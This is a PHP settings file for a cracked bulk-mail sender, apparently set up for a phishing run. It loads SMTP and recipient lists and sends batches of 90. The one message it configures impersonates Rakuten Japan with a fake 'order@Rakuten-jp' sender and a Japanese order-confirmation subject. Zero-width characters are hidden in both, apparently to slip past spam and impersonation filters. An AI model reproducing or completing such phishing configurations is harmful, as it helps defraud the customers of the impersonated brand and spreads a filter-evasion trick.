<?php
/*
 ________  _________  ___  ___  ________  ___  ________  ________  ________  ________  ________   
|\   ____\|\___   ___\\  \|\  \|\   __  \|\  \|\   ___ \|\   ____\|\   __  \|\   __  \|\   __  \  
\ \  \___|\|___ \  \_\ \  \\\  \ \  \|\  \ \  \ \  \_|\ \ \  \___|\ \  \|\  \ \  \|\  \ \  \|\  \ 
 \ \_____  \   \ \  \ \ \  \\\  \ \   ____\ \  \ \  \ \\ \ \  \    \ \  \\\  \ \   _  _\ \   ____\
  \|____|\  \   \ \  \ \ \  \\\  \ \  \___|\ \  \ \  \_\\ \ \  \____\ \  \\\  \ \  \\  \\ \  \___|
    ____\_\  \   \ \__\ \ \_______\ \__\    \ \__\ \_______\ \_______\ \_______\ \__\\ _\\ \__\   
   |\_________\   \|__|  \|_______|\|__|     \|__|\|_______|\|_______|\|_______|\|__|\|__|\|__|   
   \|_________|                                                                                
                     BY H1RUK4    https://t.me/nezuko96                   
*/
###############################################
#$            C0d3d by Amoskun               $#
#$  Recoding Tidak membuatmu menjadi Coder   $#
#$          Copyright 2019 MKATO             $#
###############################################
$timeset = 'Asia/Jakarta'; // reference for timezone http://php.net/manual/en/timezones.php


$mkato_smtp = 'smtp.csv';
$mkato_list = [
	'file'				=> 'list.txt',
	'removeduplicate'	=> false,
];

$mkato_base = [
	'user'  => [ 'license'	=> 'CRACKED-BY-H1RUK4-STUPIDCORP',
				 'cookie'	=> 'StupidCrop_session=GO-TO-HELL',
				],
	'base'	=> 'phpmailer' // phpmailer or swiftmailer
];

$mkato_setting = [
	'color'				=> true,
	'max'				=> '90', // total of emails to send per sending
	'delay'				=> '0', // delay for send
	'charset'			=> 'UTF-8',
	'encoding'			=> 'base64', // quoted-printable or base64 or 7bit or 8bit
	'insertemailtest'	=> false, // instert your email at last sending
	'emailtest'			=> 'email@tes.com', // input your email , can be multi emails
	'priority'			=> '3',	// for phpmailer: 1=high, 3=normal, 5=low || for swiftmailer 1=very high, 2=high, 3=normal, 4=low, 5=very low
	'randomparam'		=> true,
	'link'				=> 'https://link.com/', // input link here to use a random link fiture
	'header'			=> false, // optional to use header or not | true or false
];

$mkato_replace = [
		'##name##'		=> 'rias|koneko|index',	
		'##hero##'		=> 'saber|akatsuki|touma',
		'##goblok##'	=> '##mix_normal_6##|##mix_normal_10##',
];

$mkato_header = array(
	'x-header|isi data',
	'x-header|isi data',
	'x-header|isi data',
	'x-header|isi data',
);

$mkato_inbox = [
	#--start--#
	[
		'to' 					=> '', // to
		'fname' 				=> 'order@‌R‌ak‌ut‌en-jp', // from name
		'subject' 				=> "【楽‎天‎市‎場‎】 ‎ご注文内容の確認‎ 2024/01/10 (##mix_upper_10##)", // subject
		'attachfile'			=> '', // nama file pdf, kalau gak mau attach file, jangan diisi kolomnya
		'attachname' 			=> "", // nama yang diinginkan untuk ganti nama file
		'letter'				=> 'rkc.html',

	],
	#--end--#

];





?>